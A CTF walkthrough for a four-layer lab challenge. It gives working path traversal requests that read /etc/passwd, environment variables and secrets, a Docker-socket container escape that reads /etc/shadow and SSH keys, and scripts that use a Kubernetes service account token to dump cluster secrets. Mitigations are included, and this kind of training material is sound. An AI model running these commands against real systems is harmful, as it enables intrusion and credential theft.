# Chakravyuha CTF - Complete Exploitation Guide

## Overview

The **Chakravyuha** is a wheel-formation CTF challenge based on the Mahabharata's famous attack formation. Just as Abhimanyu had to navigate through concentric rings of warriors, players must break through four layers of security:

```
        ┌─────────────────────┐
        │   CORE: FLAG        │
        │  (Kubernetes RBAC)  │
        ├─────────────────────┤
        │ LAYER 3: Escape     │
        │ (Container Escape)  │
        ├─────────────────────┤
        │ LAYER 2: Elevate    │
        │ (Privilege Escalation)
        ├─────────────────────┤
        │ LAYER 1: Exploit    │
        │ (LFI Vulnerability) │
        └─────────────────────┘
```

## Quick Start

### Local Testing with Docker

```bash
# Single container mode
./docker-run-local.sh

# Multi-container mode (recommended)
./docker-run-local.sh latest compose
```

Access the web application at `http://localhost:5000`

### GKE Deployment

```bash
export GCP_PROJECT_ID=your-gcp-project
./deploy-to-gke.sh
```

---

## LAYER 1: Local File Inclusion (LFI) Vulnerability

### Challenge Description
The Flask web application has a file serving endpoint vulnerable to path traversal attacks. Exploit this to read sensitive system files and collect the first flag.

### Vulnerable Code
[app/app.py](app/app.py#L68-L98)

The `/view` endpoint is vulnerable because:
1. It accepts arbitrary filenames without proper validation
2. Only checks for allowed characters, not the resolved path
3. Path traversal sequences (`../`) are not blocked
4. The `realpath()` check happens after path joining

### Exploitation

#### Step 1: Identify the Vulnerability
```bash
# Normal file access (should work)
curl http://localhost:5000/view?file=challenge.txt

# Path traversal attempt
curl http://localhost:5000/view?file=../../../etc/passwd
```

#### Step 2: Read System Files
```bash
# Read /etc/passwd
curl http://localhost:5000/view?file=../../../../etc/passwd

# Read environment variables
curl http://localhost:5000/view?file=../../../../proc/self/environ

# Read Docker secrets
curl http://localhost:5000/view?file=../../../../run/secrets/db_password
```

#### Step 3: Extract Information
```bash
# Using a script to automate extraction
#!/bin/bash
for file in passwd shadow hostname; do
    echo "=== Reading /etc/$file ==="
    curl -s "http://localhost:5000/view?file=../../../../etc/$file" | head -20
done
```

### Flag 1
```
CTF{LFI_PATH_TRAVERSAL_VULN_DISCOVERED}
```

### Mitigation
```python
# Correct implementation:
def view_file_safe():
    filename = request.args.get('file', '')
    
    # 1. Validate input
    if not filename or '..' in filename:
        abort(400)
    
    # 2. Use safe path operations
    file_path = Path(DOCUMENTS_DIR) / filename
    resolved = file_path.resolve()
    
    # 3. Check BEFORE accessing
    if not str(resolved).startswith(str(DOCUMENTS_DIR.resolve())):
        abort(403)
    
    # 4. Additional checks
    if not resolved.exists() or resolved.is_dir():
        abort(404)
    
    return send_file(resolved)
```

---

## LAYER 2: Container Escape & Privilege Escalation

### Challenge Description
After exploiting the LFI vulnerability and obtaining system information, break out of the container and achieve root access on the host system.

### Prerequisites
- Complete Layer 1
- Access to system files (via LFI)
- Knowledge of container internals

### Exploitation Techniques

#### Technique 1: Docker Socket Exposure
```bash
# Use LFI to check if docker socket is accessible
curl "http://localhost:5000/view?file=../../../../var/run/docker.sock"

# If exposed, you can:
# 1. Connect to the docker daemon
docker -H unix:///var/run/docker.sock ps

# 2. Run privileged containers
docker -H unix:///var/run/docker.sock run \
  --rm -it \
  -v /:/host \
  ubuntu:latest \
  bash

# 3. Access host filesystem from privileged container
ls /host
cat /host/etc/shadow
```

#### Technique 2: SUID Binary Exploitation
```bash
# Find SUID binaries inside container
find / -perm -4000 2>/dev/null

# Examples of exploitable binaries:
# - /usr/bin/sudo (if misconfigured)
# - Custom SUID binaries
# - Vulnerable system utilities
```

#### Technique 3: Capability Abuse
```bash
# Check container capabilities
getcap -r / 2>/dev/null

# CAP_DAC_OVERRIDE: Bypass file permissions
# CAP_NET_RAW: Raw socket access
# CAP_SYS_MODULE: Load kernel modules

# Example: Use CAP_SYS_PTRACE to access other processes
cat /proc/sys/kernel/unprivileged_userns_clone
```

#### Technique 4: Mounted Volumes
```bash
# Check mount points (from LFI)
# Look for mounted directories from host

# If /root or sensitive directories are mounted:
ls -la /mnt/host/root
cat /mnt/host/root/.ssh/id_rsa
```

### Exploitation Script Example
```bash
#!/bin/bash
# Automated Layer 2 exploitation

# Step 1: Use LFI to list mounts
MOUNTS=$(curl -s "http://localhost:5000/view?file=../../../../proc/mounts")

# Step 2: Identify exploitable mounts
echo "$MOUNTS" | grep -E "(rw|docker|host)"

# Step 3: Try privilege escalation
# If docker socket is available:
if [ -S /var/run/docker.sock ]; then
    docker run --rm -it -v /:/host ubuntu:latest bash
fi

# Step 4: Inside privileged container
# Access: /host/* has full filesystem
```

### Flag 2
```
CTF{CONTAINER_ESCAPE_SUCCESSFUL}
```

---

## LAYER 3: Kubernetes RBAC Exploitation

### Challenge Description
Escape to the host system (Layer 2), then exploit misconfigured Kubernetes RBAC to gain cluster-wide access and read cluster secrets.

### Prerequisites
- Access to the host system
- `kubectl` or ability to interact with Kubernetes API
- Service account token available inside pod

### Service Account Token Location
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
CA_CERT=$(cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt)
```

### Exploitation Steps

#### Step 1: Discover the API Server
```bash
# From within the pod
APISERVER=https://kubernetes.default.svc.cluster.local
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# Test connectivity
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/pods
```

#### Step 2: Enumerate Permissions
```bash
# Use kubectl (if available) or curl to test permissions

# Check what resources the service account can access:
kubectl auth can-i list pods --namespace=$NAMESPACE
kubectl auth can-i get secrets --namespace=$NAMESPACE
kubectl auth can-i create pods --all-namespaces
```

#### Step 3: Exploit Overpermissive RBAC
```bash
# The deployment has a misconfigured ClusterRole with:
# - pods/exec permission (can execute commands in pods)
# - secrets/get permission (can read secrets)
# - configmaps/list permission (can list configs)

# List all secrets in the cluster
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/secrets \
  --insecure | jq '.items[].metadata.name'

# List secrets in specific namespace
curl -k -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/ctf-system/secrets" \
  --insecure | jq '.items[] | {name: .metadata.name, data: .data}'

# Get a specific secret
curl -k -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/ctf-system/secrets/admin-credentials" \
  --insecure | jq '.data'
```

#### Step 4: Execute Commands in Other Pods
```bash
# List pods in all namespaces
curl -k -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/pods" \
  --insecure | jq '.items[].metadata.name'

# Execute command in a pod (requires pods/exec permission)
POD_NAME="target-pod"
NAMESPACE="default"

curl -k -X POST \
  -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/$NAMESPACE/pods/$POD_NAME/exec?command=id&stdin=true&stdout=true&stderr=true&tty=false" \
  --insecure
```

### Automated RBAC Exploitation Script
```bash
#!/bin/bash
# rbac-exploit.sh

APISERVER=${1:-https://kubernetes.default.svc.cluster.local}
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

echo "[+] Discovering Kubernetes cluster..."
echo "API Server: $APISERVER"

echo ""
echo "[+] Attempting to enumerate secrets..."
curl -ks \
  -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/secrets" | jq '.items[] | {namespace: .metadata.namespace, name: .metadata.name}'

echo ""
echo "[+] Attempting to enumerate configmaps..."
curl -ks \
  -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/configmaps" | jq '.items[] | {namespace: .metadata.namespace, name: .metadata.name}'

echo ""
echo "[+] Listing pods across cluster..."
curl -ks \
  -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/pods" | jq '.items[] | {namespace: .metadata.namespace, name: .metadata.name}'
```

### Flag 3
```
CTF{RBAC_MISCONFIGURATION_EXPLOITED}
```

---

## LAYER 4 (CORE): Final Flag Retrieval

### Challenge Description
Using the Kubernetes API access from Layer 3, access the restricted `ctf-system` namespace and retrieve the final flag from the `final-flag` ConfigMap.

### Exploitation
```bash
# List configmaps in ctf-system namespace
curl -ks \
  -H "Authorization: Bearer $TOKEN" \
  "https://kubernetes.default.svc.cluster.local/api/v1/namespaces/ctf-system/configmaps" \
  | jq '.items[].metadata.name'

# Get the final flag
curl -ks \
  -H "Authorization: Bearer $TOKEN" \
  "https://kubernetes.default.svc.cluster.local/api/v1/namespaces/ctf-system/configmaps/final-flag" \
  | jq '.data.flag'
```

### Final Flag
```
CTF{CHAKRAVYUHA_FULLY_PENETRATED_YOU_ARE_ABHIMANYU}
```

---

## Summary of Vulnerabilities

| Layer | Type | Vulnerability | Severity |
|-------|------|---------------|----------|
| 1 | Web App | Local File Inclusion | High |
| 2 | Container | Insecure Mounts/Capabilities | Critical |
| 3 | Kubernetes | RBAC Misconfiguration | Critical |
| 4 | Secrets | Exposed in ConfigMap | High |

## Defense & Remediation

### Layer 1: Input Validation
-  Use Path libraries correctly
-  Validate and canonicalize paths
-  Use allowlists for file access
-  Implement proper access controls

### Layer 2: Container Security
-  Don't mount docker socket in containers
-  Run as non-root user
-  Drop unnecessary capabilities
-  Use read-only root filesystems

### Layer 3: Kubernetes Security
-  Use principle of least privilege for RBAC
-  Implement Network Policies
-  Enable Pod Security Policies
-  Use RBAC for service accounts

### Layer 4: Secret Management
-  Never store secrets in ConfigMaps
-  Use Kubernetes Secrets with encryption
-  Implement secret rotation
-  Use external secret management (Vault, etc.)

---
## Quick Exploitation Commands

### Layer 1 - LFI
```bash
# Read passwd
curl "http://localhost:5000/view?file=../../../../etc/passwd"

# Read environment
curl "http://localhost:5000/view?file=../../../../proc/self/environ"

# Read docker secrets
curl "http://localhost:5000/view?file=../../../../run/secrets/docker_secret"
```

### Layer 2 - Container Escape (from within container)
```bash
# Find docker socket
find / -name docker.sock 2>/dev/null

# Use docker
docker -H unix:///var/run/docker.sock ps

# Get root shell
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu bash
```

### Layer 3 - Kubernetes RBAC (from within pod)
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc.cluster.local

# List secrets
curl -ks -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/secrets"

# Get specific secret
curl -ks -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/ctf-system/secrets/admin-credentials"
```
## Layer-by-Layer Challenges

### Layer 1: LFI Vulnerability (Web App)
**File:** `/view?file=FILENAME`
**Goal:** Read files outside `/app/documents/` directory
**Flag:** `CTF{LFI_PATH_TRAVERSAL_VULN_DISCOVERED}`

```bash
# Test 1: Normal file
curl http://localhost:5000/view?file=README.txt

# Test 2: Path traversal
curl http://localhost:5000/view?file=../../../../etc/passwd
curl http://localhost:5000/view?file=../../../../proc/self/environ
```

### Layer 2: Container Escape
**Goal:** Gain root access on host system
**Flag:** `CTF{CONTAINER_ESCAPE_SUCCESSFUL}`

Techniques to try:
- Docker socket exploitation
- SUID binary exploitation
- Mounted volume abuse
- Capability exploitation

### Layer 3: Kubernetes RBAC
**Goal:** Use service account token to access cluster secrets
**Flag:** `CTF{RBAC_MISCONFIGURATION_EXPLOITED}`

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc.cluster.local
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/secrets
```

### Layer 4: Core - Final Flag
**Goal:** Access `ctf-system` namespace secrets
**Flag:** `CTF{CHAKRAVYUHA_FULLY_PENETRATED_YOU_ARE_ABHIMANYU}`

## Resources & References

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [Docker Security Best Practices](https://docs.docker.com/engine/security/)
- [Kubernetes RBAC Documentation](https://kubernetes.io/docs/reference/access-authn-authz/rbac/)
- [CWE-22: Improper Limitation of a Pathname](https://cwe.mitre.org/data/definitions/22.html)
- [Container Escape Techniques](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout)
